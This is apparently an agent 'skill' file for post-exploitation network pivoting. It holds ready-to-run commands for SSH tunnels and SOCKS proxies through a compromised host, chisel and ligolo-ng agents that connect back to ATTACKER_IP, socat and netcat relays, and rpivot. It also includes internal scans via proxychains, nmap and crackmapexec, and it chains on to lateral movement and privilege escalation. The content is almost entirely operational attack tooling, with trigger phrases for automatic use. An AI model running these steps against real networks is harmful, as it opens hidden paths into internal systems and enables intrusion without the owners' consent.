---
name: post-pivoting
description: "Network pivoting skill for post-exploitation — SSH tunneling, SOCKS proxy, chisel, ligolo-ng, socat port forwarding, double pivot, rpivot. Triggers: 'pivoting', 'network pivot', 'tunnel', 'socks proxy', 'ssh tunnel', 'port forwarding', 'chisel', 'ligolo', 'rpivot', 'double pivot', 'internal network access'."
---

# Network Pivoting

Tunnel traffic through a compromised host to reach internal network segments.

---

## Phase 1: SSH Tunneling

```bash
JUMP_HOST="COMPROMISED_HOST"
JUMP_USER="ubuntu"
JUMP_KEY="~/.ssh/id_rsa"

# Local port forward — reach internal host via jump host:
# Access 10.0.0.10:80 via localhost:8080
ssh -L 8080:10.0.0.10:80 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &
curl -s http://localhost:8080/

# Dynamic SOCKS5 proxy — route all traffic through jump host:
ssh -D 1080 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &
# Use proxychains:
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains nmap -sT -p 22,80,443,8080 10.0.0.0/24

# Remote port forward — expose attacker port on jump host:
ssh -R 4444:localhost:4444 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &

# Double pivot:
ssh -L 8080:10.0.0.10:3389 -N -i $JUMP_KEY $JUMP_USER@$JUMP_HOST &  # Jump1 → internal RDP
```

---

## Phase 2: Chisel (HTTP Tunneling)

```bash
# Download chisel: https://github.com/jpillora/chisel/releases
CHISEL="/opt/chisel"

# Attacker (server):
$CHISEL server -p 8080 --reverse &

# On compromised host (client):
./chisel client ATTACKER_IP:8080 R:socks &

# Now use SOCKS5 on attacker at 127.0.0.1:1080:
proxychains curl http://10.0.0.10/

# Port-specific forward via chisel:
# Attacker:
$CHISEL server -p 8080 --reverse &
# Target:
./chisel client ATTACKER_IP:8080 R:3306:127.0.0.1:3306 &
# Now attacker can reach MySQL: mysql -h 127.0.0.1 -P 3306
```

---

## Phase 3: Ligolo-ng

```bash
# Download: https://github.com/nicocha30/ligolo-ng/releases

# Attacker setup:
./proxy -selfcert -laddr 0.0.0.0:11601 &
# In ligolo UI: interface_add --name ligolo

# On compromised host:
./agent -connect ATTACKER_IP:11601 -ignore-cert

# In ligolo interface:
# session → select session → start
# Add route: ip route add 10.0.0.0/24 dev ligolo
# Access: curl http://10.0.0.10/
```

---

## Phase 4: Socat & Netcat Forwarding

```bash
INTERNAL_HOST="10.0.0.10"
INTERNAL_PORT="80"
LOCAL_PORT="8080"

# Socat port forward (run on compromised host):
socat TCP-LISTEN:$LOCAL_PORT,fork TCP:$INTERNAL_HOST:$INTERNAL_PORT &

# Netcat relay (old-school):
mkfifo /tmp/pipe
nc -lvnp $LOCAL_PORT < /tmp/pipe | nc $INTERNAL_HOST $INTERNAL_PORT > /tmp/pipe &

# rpivot (HTTP tunnel through proxy):
# Attacker: python2 server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
# Target: python2 client.py --server-ip ATTACKER_IP --server-port 9999
```

---

## Phase 5: Internal Discovery via Pivot

```bash
# After setting up SOCKS5 proxy at 127.0.0.1:1080:
proxychains nmap -sT -p 21,22,25,80,443,445,3306,3389,5432,8080 10.0.0.0/24 2>/dev/null | tee output/internal_scan.txt
proxychains curl -s http://10.0.0.10/ | head -20
proxychains crackmapexec smb 10.0.0.0/24 2>/dev/null
```

---

## Output

Save to `output/`:
- `internal_scan.txt` — internal network port scan results
- `pivot_diagram.txt` — tunneling chain documentation

## Next Phase

→ `red-lateral` for lateral movement techniques
→ `post-linux-privesc` or `post-windows-privesc` for local privesc
